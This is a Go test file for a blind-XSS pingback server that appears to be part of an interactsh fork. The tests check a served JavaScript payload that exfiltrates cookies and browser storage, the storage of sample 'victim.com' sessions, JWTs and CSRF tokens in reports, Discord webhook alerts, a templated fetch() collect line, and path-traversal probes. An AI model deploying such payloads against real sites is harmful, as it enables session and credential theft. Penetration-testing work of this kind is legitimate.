package server

import (
	"encoding/json"
	"io"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"sync/atomic"
	"testing"
	"time"

	"github.com/ounissi-zakaria/interactsh/pkg/storage"
)

func TestXSSHandler(t *testing.T) {
	xssDir, err := os.MkdirTemp("", "xss-test-*")
	if err != nil {
		t.Fatal(err)
	}
	defer os.RemoveAll(xssDir)

	storeOpts := storage.DefaultOptions
	storeOpts.EvictionTTL = -1
	store, _ := storage.New(&storeOpts)

	opts := &Options{
		Domains:                  []string{"localhost"},
		ListenIP:                 "127.0.0.1",
		HttpPort:                 0,
		HttpsPort:                0,
		DnsPort:                  0,
		SmtpPort:                 0,
		SmtpsPort:                0,
		SmtpAutoTLSPort:          0,
		FtpPort:                  0,
		FtpsPort:                 0,
		LdapPort:                 0,
		SmbPort:                  0,
		Storage:                  store,
		OriginURL:                "*",
		CorrelationIdLength:      20,
		CorrelationIdNonceLength: 13,
		Version:                  "test",
		XSSDir:                   xssDir,
		Stats:                    &Metrics{},
	}

	httpServer, err := NewHTTPServer(opts)
	if err != nil {
		t.Fatal(err)
	}

	srv := httptest.NewServer(httpServer.tlsserver.Handler)
	defer srv.Close()
	srvHost := strings.TrimPrefix(srv.URL, "http://")

	client := srv.Client()

	t.Run("GET / serves XSS payload targeting the requested host", func(t *testing.T) {
		resp, err := client.Get(srv.URL + "/")
		if err != nil {
			t.Fatal(err)
		}
		defer resp.Body.Close()

		if resp.StatusCode != http.StatusOK {
			t.Fatalf("expected 200, got %d", resp.StatusCode)
		}
		ct := resp.Header.Get("Content-Type")
		if ct != "application/javascript" {
			t.Fatalf("expected application/javascript, got %s", ct)
		}
		body, _ := io.ReadAll(resp.Body)
		if !strings.Contains(string(body), "XMLHttpRequest") {
			t.Fatalf("expected XSS payload to contain XMLHttpRequest, got: %s", string(body)[:100])
		}
		if !strings.Contains(string(body), "//"+srvHost+"/x/") {
			t.Fatalf("expected XSS payload to contain //%s/x/, got: %s", srvHost, string(body)[:200])
		}
		if !strings.Contains(string(body), "localStorage") || !strings.Contains(string(body), "sessionStorage") {
			t.Fatalf("expected XSS payload to contain localStorage/sessionStorage")
		}
		t.Logf("XSS payload served correctly (%d bytes)", len(body))
	})

	t.Run("GET / with subdomain host bakes subdomain into payload", func(t *testing.T) {
		req, _ := http.NewRequest(http.MethodGet, srv.URL+"/", nil)
		req.Host = "id1.localhost"
		resp, err := client.Do(req)
		if err != nil {
			t.Fatal(err)
		}
		defer resp.Body.Close()

		if resp.StatusCode != http.StatusOK {
			t.Fatalf("expected 200, got %d", resp.StatusCode)
		}
		body, _ := io.ReadAll(resp.Body)
		if !strings.Contains(string(body), "//id1.localhost/x/") {
			t.Fatalf("expected payload to target //id1.localhost/x/, got: %s", string(body)[:200])
		}
	})

	t.Run("POST /x saves pingback and appends JSONL hit", func(t *testing.T) {
		payload := strings.NewReader(`{"url":"https://victim.com/admin","cookie":"session=abc123","domain":"victim.com","referrer":"https://victim.com/","ua":"Mozilla/5.0","title":"Admin Panel","dom":"<html><head><title>Admin</title></head><body><h1>Admin Dashboard</h1></body></html>","localStorage":{"token":"jwt-abc-123","theme":"dark"},"sessionStorage":{"temp":"data","csrf":"xyz789"}}`)
		resp, err := client.Post(srv.URL+"/x/", "text/plain", payload)
		if err != nil {
			t.Fatal(err)
		}
		defer resp.Body.Close()

		if resp.StatusCode != http.StatusOK {
			t.Fatalf("expected 200, got %d", resp.StatusCode)
		}

		report := onlyHTMLReport(t, xssDir)
		content, _ := os.ReadFile(filepath.Join(xssDir, report))
		htmlStr := string(content)
		t.Logf("Saved report: %s (%d bytes)", report, len(content))

		for _, want := range []string{"XSS Pingback Report", "victim.com", "session=abc123", "Admin Panel", "DOM", "jwt-abc-123", "csrf", "xyz789", "Payload ID"} {
			if !strings.Contains(htmlStr, want) {
				t.Errorf("report missing expected string: %s", want)
			}
		}

		line := readSingleHitLine(t, xssDir)
		if line["report"] != report {
			t.Errorf("expected jsonl report field %q, got %v", report, line["report"])
		}
		for _, key := range []string{"timestamp", "id", "payload_id", "host", "remote_ip"} {
			if _, ok := line[key]; !ok {
				t.Errorf("jsonl record missing key: %s", key)
			}
		}
		if line["url"] != "https://victim.com/admin" {
			t.Errorf("expected url field 'https://victim.com/admin', got %v", line["url"])
		}
		if line["cookie"] != "session=abc123" {
			t.Errorf("expected cookie field 'session=abc123', got %v", line["cookie"])
		}
		if line["title"] != "Admin Panel" {
			t.Errorf("expected title field 'Admin Panel', got %v", line["title"])
		}
		if line["user_agent"] != "Mozilla/5.0" {
			t.Errorf("expected user_agent field 'Mozilla/5.0', got %v", line["user_agent"])
		}
	})

	t.Run("POST /x from subdomain host records payload id", func(t *testing.T) {
		req, _ := http.NewRequest(http.MethodPost, srv.URL+"/x/", strings.NewReader(`{"url":"https://victim.com/panel","domain":"victim.com","ua":"UA","title":"T","dom":""}`))
		req.Host = "site2.localhost"
		req.Header.Set("Content-Type", "text/plain")
		resp, err := client.Do(req)
		if err != nil {
			t.Fatal(err)
		}
		resp.Body.Close()
		if resp.StatusCode != http.StatusOK {
			t.Fatalf("expected 200, got %d", resp.StatusCode)
		}

		lines := readHitLines(t, xssDir)
		if len(lines) != 2 {
			t.Fatalf("expected 2 jsonl lines, got %d", len(lines))
		}
		last := lines[1]
		if last["payload_id"] != "site2" {
			t.Errorf("expected payload_id 'site2', got %v", last["payload_id"])
		}
		if last["host"] != "site2.localhost" {
			t.Errorf("expected host 'site2.localhost', got %v", last["host"])
		}

		content, _ := os.ReadFile(filepath.Join(xssDir, last["report"].(string)))
		if !strings.Contains(string(content), "site2") {
			t.Errorf("expected report HTML to contain payload id 'site2'")
		}
	})

	t.Run("GET /x/{id} serves report", func(t *testing.T) {
		report := onlyHTMLReport(t, xssDir)
		id := strings.TrimSuffix(report, ".html")
		resp, err := client.Get(srv.URL + "/x/" + id)
		if err != nil {
			t.Fatal(err)
		}
		defer resp.Body.Close()

		if resp.StatusCode != http.StatusOK {
			t.Fatalf("expected 200, got %d", resp.StatusCode)
		}
		ct := resp.Header.Get("Content-Type")
		if !strings.Contains(ct, "text/html") {
			t.Fatalf("expected text/html, got %s", ct)
		}
		body, _ := io.ReadAll(resp.Body)
		if !strings.Contains(string(body), "XSS Pingback Report") {
			t.Fatalf("expected report HTML, got: %s", string(body)[:200])
		}
		t.Logf("Report served correctly for id %s (%d bytes)", id, len(body))
	})

	t.Run("GET /x/nonexistent returns 404", func(t *testing.T) {
		resp, err := client.Get(srv.URL + "/x/nonexistent")
		if err != nil {
			t.Fatal(err)
		}
		defer resp.Body.Close()
		if resp.StatusCode != http.StatusNotFound {
			t.Fatalf("expected 404, got %d", resp.StatusCode)
		}
	})

	t.Run("GET /x/ returns 404", func(t *testing.T) {
		resp, err := client.Get(srv.URL + "/x/")
		if err != nil {
			t.Fatal(err)
		}
		defer resp.Body.Close()
		if resp.StatusCode != http.StatusNotFound {
			t.Fatalf("expected 404, got %d", resp.StatusCode)
		}
	})

	// The hits.jsonl log must never be reachable over HTTP, including via
	// encoded suffixes, null bytes, extension tricks or traversal fragments.
	t.Run("hits.jsonl is not reachable over HTTP", func(t *testing.T) {
		for _, path := range []string{
			"/x/hits.jsonl",
			"/x/hits.jsonl%23",
			"/x/hits.jsonl%00",
			"/x/hits.jsonl.html",
			"/x/hits%2ejso%6el",
			"/x/..%2fhits.jsonl",
			"/x/%2e%2e/hits.jsonl",
			"/x/hits.jsonl?",
		} {
			resp, err := client.Get(srv.URL + path)
			if err != nil {
				t.Fatal(err)
			}
			body, _ := io.ReadAll(resp.Body)
			resp.Body.Close()
			if strings.Contains(string(body), "remote_ip") {
				t.Errorf("path %s leaked jsonl content (status %d)", path, resp.StatusCode)
			}
			if strings.HasPrefix(path, "/x/hits.jsonl") && resp.StatusCode == http.StatusOK {
				t.Errorf("path %s returned 200 for the hit log", path)
			}
		}
	})
}

// onlyHTMLReport returns the single .html report file in dir, failing if none exists.
func onlyHTMLReport(t *testing.T, dir string) string {
	t.Helper()
	entries, _ := os.ReadDir(dir)
	var reports []string
	for _, e := range entries {
		if strings.HasSuffix(e.Name(), ".html") {
			reports = append(reports, e.Name())
		}
	}
	if len(reports) == 0 {
		t.Fatal("expected at least one .html report in xss dir")
	}
	return reports[len(reports)-1]
}

func readHitLines(t *testing.T, dir string) []map[string]interface{} {
	t.Helper()
	data, err := os.ReadFile(filepath.Join(dir, xssHitsFilename))
	if err != nil {
		t.Fatalf("expected %s to exist: %s", xssHitsFilename, err)
	}
	rawLines := strings.Split(strings.TrimRight(string(data), "\n"), "\n")
	lines := make([]map[string]interface{}, 0, len(rawLines))
	for _, raw := range rawLines {
		var line map[string]interface{}
		if err := json.Unmarshal([]byte(raw), &line); err != nil {
			t.Fatalf("invalid jsonl line %q: %s", raw, err)
		}
		lines = append(lines, line)
	}
	return lines
}

func readSingleHitLine(t *testing.T, dir string) map[string]interface{} {
	t.Helper()
	lines := readHitLines(t, dir)
	if len(lines) != 1 {
		t.Fatalf("expected exactly 1 jsonl line, got %d", len(lines))
	}
	return lines[0]
}

func TestExtractPayloadID(t *testing.T) {
	cases := []struct {
		host    string
		domains []string
		want    string
	}{
		{"id1.example.com", []string{"example.com"}, "id1"},
		{"id1.example.com:8443", []string{"example.com"}, "id1"},
		{"site1.prod.example.com", []string{"example.com"}, "site1.prod"},
		{"example.com", []string{"example.com"}, ""},
		{"example.com:443", []string{"example.com"}, ""},
		{"unrelated.org", []string{"example.com"}, ""},
		{"ID1.Example.COM", []string{"example.com"}, "id1"},
		{"id1.example.com.", []string{"example.com."}, "id1"},
		{"aexample.com", []string{"example.com"}, ""},                      // no label boundary
		{"x.a.example.com", []string{"example.com", "a.example.com"}, "x"}, // longest domain suffix stripped
		{"id2.example.com", []string{""}, ""},
	}
	for _, c := range cases {
		if got := extractPayloadID(c.host, c.domains); got != c.want {
			t.Errorf("extractPayloadID(%q, %v) = %q, want %q", c.host, c.domains, got, c.want)
		}
	}
}

func TestXSSPayloadFor(t *testing.T) {
	h := &HTTPServer{options: &Options{Domains: []string{"fallback.example.com"}}}

	req := httptest.NewRequest(http.MethodGet, "http://id1.example.com/", nil)
	if got := h.xssPayloadFor(req); !strings.Contains(got, "//id1.example.com/x/") {
		t.Errorf("default payload should bake request host, got: %s", got)
	}

	// HTTP/1.0-style request without a Host header falls back to Domains[0].
	reqNoHost := httptest.NewRequest(http.MethodGet, "http://fallback.example.com/", nil)
	reqNoHost.Host = ""
	if got := h.xssPayloadFor(reqNoHost); !strings.Contains(got, "//fallback.example.com/x/") {
		t.Errorf("empty host should fall back to first domain, got: %s", got)
	}

	h.customBanner = "fetch('https://{HOST}/collect',{HOST})"
	if got := h.xssPayloadFor(req); got != "fetch('https://id1.example.com/collect',id1.example.com)" {
		t.Errorf("custom payload should substitute {HOST}, got: %s", got)
	}

	h.customBanner = "fetch('https://static/collect')"
	if got := h.xssPayloadFor(req); got != h.customBanner {
		t.Errorf("custom payload without placeholder should be served untouched, got: %s", got)
	}
}

func TestXSSHitLogAppendFailure(t *testing.T) {
	xssDir, err := os.MkdirTemp("", "xss-test-logfail-*")
	if err != nil {
		t.Fatal(err)
	}
	defer os.RemoveAll(xssDir)

	// A directory named hits.jsonl makes every append fail deterministically.
	if err := os.Mkdir(filepath.Join(xssDir, xssHitsFilename), 0755); err != nil {
		t.Fatal(err)
	}

	storeOpts := storage.DefaultOptions
	storeOpts.EvictionTTL = -1
	store, _ := storage.New(&storeOpts)

	opts := &Options{
		Domains:                  []string{"localhost"},
		ListenIP:                 "127.0.0.1",
		Storage:                  store,
		OriginURL:                "*",
		CorrelationIdLength:      20,
		CorrelationIdNonceLength: 13,
		Version:                  "test",
		XSSDir:                   xssDir,
		Stats:                    &Metrics{},
	}
	httpServer, err := NewHTTPServer(opts)
	if err != nil {
		t.Fatal(err)
	}
	srv := httptest.NewServer(httpServer.tlsserver.Handler)
	defer srv.Close()

	resp, err := srv.Client().Post(srv.URL+"/x/", "text/plain", strings.NewReader(`{"url":"https://victim.com/","dom":""}`))
	if err != nil {
		t.Fatal(err)
	}
	resp.Body.Close()

	// The report is the primary artifact: append failure must not fail the pingback.
	if resp.StatusCode != http.StatusOK {
		t.Fatalf("expected 200 despite jsonl append failure, got %d", resp.StatusCode)
	}
	if report := onlyHTMLReport(t, xssDir); report == "" {
		t.Fatal("expected HTML report to be written despite jsonl append failure")
	}
}

func TestDiscordNotification(t *testing.T) {
	var received atomic.Pointer[discordWebhookPayload]

	webhookSrv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		body, _ := io.ReadAll(r.Body)
		var payload discordWebhookPayload
		if err := json.Unmarshal(body, &payload); err != nil {
			t.Logf("webhook server received invalid JSON: %v", err)
			w.WriteHeader(http.StatusBadRequest)
			return
		}
		received.Store(&payload)
		w.WriteHeader(http.StatusNoContent)
	}))
	defer webhookSrv.Close()

	xssDir, err := os.MkdirTemp("", "xss-discord-test-*")
	if err != nil {
		t.Fatal(err)
	}
	defer os.RemoveAll(xssDir)

	storeOpts := storage.DefaultOptions
	storeOpts.EvictionTTL = -1
	store, _ := storage.New(&storeOpts)

	opts := &Options{
		Domains:                  []string{"localhost"},
		ListenIP:                 "127.0.0.1",
		HttpPort:                 0,
		HttpsPort:                0,
		DnsPort:                  0,
		SmtpPort:                 0,
		SmtpsPort:                0,
		SmtpAutoTLSPort:          0,
		FtpPort:                  0,
		FtpsPort:                 0,
		LdapPort:                 0,
		SmbPort:                  0,
		Storage:                  store,
		OriginURL:                "*",
		CorrelationIdLength:      20,
		CorrelationIdNonceLength: 13,
		Version:                  "test",
		XSSDir:                   xssDir,
		DiscordWebhook:           webhookSrv.URL,
		Stats:                    &Metrics{},
	}

	httpServer, err := NewHTTPServer(opts)
	if err != nil {
		t.Fatal(err)
	}

	srv := httptest.NewServer(httpServer.tlsserver.Handler)
	defer srv.Close()

	client := srv.Client()

	t.Run("POST /x/ triggers Discord notification", func(t *testing.T) {
		req, _ := http.NewRequest(http.MethodPost, srv.URL+"/x/", strings.NewReader(`{"url":"https://victim.com/secret","cookie":"sid=xyz","domain":"victim.com","ua":"TestBot/1.0","title":"Secret Page","dom":"<html></html>","localStorage":{},"sessionStorage":{}}`))
		req.Host = "site9.localhost"
		req.Header.Set("Content-Type", "text/plain")
		resp, err := client.Do(req)
		if err != nil {
			t.Fatal(err)
		}
		resp.Body.Close()

		if resp.StatusCode != http.StatusOK {
			t.Fatalf("expected 200, got %d", resp.StatusCode)
		}

		// Wait for async goroutine to send notification
		var webhookPayload *discordWebhookPayload
		for range 50 {
			webhookPayload = received.Load()
			if webhookPayload != nil {
				break
			}
			time.Sleep(10 * time.Millisecond)
		}
		if webhookPayload == nil {
			t.Fatal("Discord webhook was never called")
		}

		if len(webhookPayload.Embeds) != 1 {
			t.Fatalf("expected 1 embed, got %d", len(webhookPayload.Embeds))
		}

		embed := webhookPayload.Embeds[0]
		if embed.Title != "XSS Pingback Fired" {
			t.Errorf("expected title 'XSS Pingback Fired', got %s", embed.Title)
		}
		if embed.Color != discordEmbedColor {
			t.Errorf("expected color %d, got %d", discordEmbedColor, embed.Color)
		}

		fieldNames := make(map[string]string)
		for _, f := range embed.Fields {
			fieldNames[f.Name] = f.Value
		}

		if fieldNames["URL"] != "https://victim.com/secret" {
			t.Errorf("expected URL 'https://victim.com/secret', got %s", fieldNames["URL"])
		}
		if fieldNames["Domain"] != "victim.com" {
			t.Errorf("expected Domain 'victim.com', got %s", fieldNames["Domain"])
		}
		if fieldNames["Payload ID"] != "site9" {
			t.Errorf("expected Payload ID 'site9', got %s", fieldNames["Payload ID"])
		}
		if !strings.Contains(fieldNames["Report"], "site9.localhost/x/") {
			t.Errorf("expected Report to contain 'site9.localhost/x/', got %s", fieldNames["Report"])
		}
		if !strings.Contains(fieldNames["Cookies"], "sid=xyz") {
			t.Errorf("expected Cookies to contain 'sid=xyz', got %s", fieldNames["Cookies"])
		}
		t.Logf("Discord notification sent with %d fields", len(embed.Fields))
	})
}

func TestTruncate(t *testing.T) {
	if truncate("hello", 10) != "hello" {
		t.Error("short string should not be truncated")
	}
	if truncate("hello world", 8) != "hello..." {
		t.Errorf("expected 'hello...', got '%s'", truncate("hello world", 8))
	}
}
